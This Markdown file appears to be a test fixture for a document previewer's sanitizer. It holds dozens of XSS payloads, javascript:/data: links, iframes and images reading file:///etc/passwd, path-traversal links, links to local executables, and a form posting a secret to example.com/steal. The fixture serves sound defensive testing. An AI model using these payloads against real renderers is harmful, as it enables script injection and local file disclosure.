# Hostile document

Every payload below tries to run script, load a local file, or navigate the preview. Each one that runs calls `__p('<name>')`;
the test pages define `__p` to record the name, the real preview has no such function. Nothing here may execute, load,
navigate or open anything. (Also see `Web/test/hostile.test.mjs` and `LinkPolicyTests.swift`.)

## Script and event handlers

<script>__p('script-tag')</script>

<script src="data:text/javascript,__p('script-src-data')"></script>

<img src="x" onerror="__p('img-onerror')">

<img src="x" onerror=__p('img-onerror-unquoted')//>

<a href="#" onclick="__p('a-onclick')" id="hostile-onclick">click me</a>

<div onmouseover="__p('div-onmouseover')" style="position:fixed;inset:0;width:100%;height:100%">hover</div>

<details open ontoggle="__p('details-ontoggle')"><summary>x</summary>y</details>

<input autofocus onfocus="__p('input-onfocus')">

<video><source src="x" onerror="__p('video-onerror')"></video>

<body onload="__p('body-onload')">

<style>@import url("file:///etc/passwd"); body { background: url("file:///etc/passwd"); }</style>

<link rel="stylesheet" href="file:///etc/passwd">

## javascript: and data: links

<a href="javascript:__p('js-link')" id="hostile-js">js link</a>

<a href="JaVaScRiPt:__p('js-link-mixed-case')">mixed case</a>

<a href="&#106;avascript:__p('js-link-entity')">entity</a>

<a href="java&#x09;script:__p('js-link-tab')">tab inside scheme</a>

<a href="data:text/html,<script>__p('data-link')</script>">data link</a>

<a href="blob:https://example.com/00000000-0000-0000-0000-000000000000">blob link</a>

[markdown js link](javascript:__p('md-js-link'))

[markdown data link](data:text/html;base64,PHNjcmlwdD5fX3AoJ21kLWRhdGEnKTwvc2NyaXB0Pg==)

[title injection](https://example.com/ "x\" onmouseover=\"__p('title-injection')")

![alt injection" onerror="__p('alt-injection')](pic.png)

# <img src=x onerror=__p('heading-onerror')>

## Frames, plugins, SVG

<iframe src="file:///etc/passwd"></iframe>

<iframe srcdoc="<script>parent.__p('iframe-srcdoc')</script>"></iframe>

<iframe src="javascript:parent.__p('iframe-javascript')"></iframe>

<iframe src="https://example.com/"></iframe>

<object data="file:///etc/hosts" type="text/plain"></object>

<object data="data:text/html,<script>parent.__p('object-data')</script>"></object>

<embed src="file:///etc/hosts">

<svg onload="__p('svg-onload')" width="10" height="10"></svg>

<svg><script>__p('svg-script')</script></svg>

<svg><a xlink:href="javascript:__p('svg-xlink-js')"><text x="10" y="20">svg link</text></a></svg>

<svg><animate onbegin="__p('svg-animate')" attributeName="x" dur="1s"></svg>

<svg><foreignObject><iframe srcdoc="<script>parent.__p('svg-foreign')</script>"></iframe></foreignObject></svg>

<math><mi xlink:href="javascript:__p('math-xlink')">x</mi></math>

## Navigation tricks

<meta http-equiv="refresh" content="0;url=https://example.com/refresh">

<base href="https://example.com/base/">

<form action="https://example.com/steal" method="post"><input name="x" value="secret"><button id="hostile-submit">send</button></form>

<a href="https://example.com/" target="_blank" rel="opener">new window</a>

## Links the navigation policy sees

<a href="file:///Applications/Calculator.app" download id="hostile-calc">Calculator</a>

<a href="file:///Applications/Calculator.app">Calculator, no download</a>

<a href="file:///usr/bin/true">a unix executable</a>

<a href="file://server/share/doc.md">remote host</a>

[exec by relative path](../../../../../../Applications/Calculator.app)

[script next to the document](run.sh)

[app next to the document](Tool.app)

[installer](Setup.pkg)

[document in the folder](notes/readme.md)

[document one level up, outside the folder](../outside.md)

[page in the folder](other.md#section)

[a pdf](report.pdf)

[missing](does-not-exist.md)

[root relative](/etc/passwd)

[web page](https://example.com/page)

[web page, plain http](http://example.com/page)

[mail](mailto:someone@example.com)

[system settings](x-apple.systempreferences:com.apple.preference.security)

[ssh](ssh://root@example.com)

[smb mount](smb://example.com/share)

[anchor to a heading](#hostile-document)

[anchor to a hand written name](#manual-anchor)

<a name="manual-anchor"></a>Hand written anchor target.

<p id="html-id-target">Element with an id.</p>

[anchor to an id](#html-id-target)

[anchor that does not exist](#nothing-here)

## Images that try to leave the folder

![up](../../../../../../etc/passwd)

![encoded up](..%2f..%2f..%2fetc%2fpasswd)

![dot encoded](%2e%2e/%2e%2e/secret.png)

![windows style](..\..\secret.png)

![root](/etc/passwd)

![protocol relative](//example.com/x.png)

![file url](file:///etc/passwd)

<img src="file:///etc/passwd">

<img src="../secret.png">

## Parser stress

[unclosed](<javascript:__p('bracket')>

<<script>__p('double-open')//<</script>

<a href="x" href="javascript:__p('dup-attr')">dup</a>

`<script>__p('inside-code')</script>`

```html
<script>__p('inside-fence')</script>
```
